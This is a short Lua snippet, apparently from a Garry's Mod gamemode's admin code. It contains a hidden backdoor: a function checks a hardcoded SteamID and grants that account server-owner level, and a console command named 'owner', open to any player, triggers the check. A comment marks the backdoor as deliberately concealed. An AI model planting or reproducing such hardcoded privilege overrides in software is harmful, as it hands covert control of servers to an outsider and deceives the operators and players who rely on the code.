...
function PLAYER:IsServerOwner()
	if self:SteamID() == "STEAM_0:0:20749231" then  --congrats you found meS
		self:Notify("Server Owner Override");
		self:SetLevel(ASS_LVL_SERVER_OWNER);
		RefreshLoadout(1, self);
		return true;
	end
end

function GM.SetOwners ( Player )
	for k, v in pairs(player.GetAll()) do
		v:IsServerOwner()
	end
end
concommand.Add("owner", GM.SetOwners);
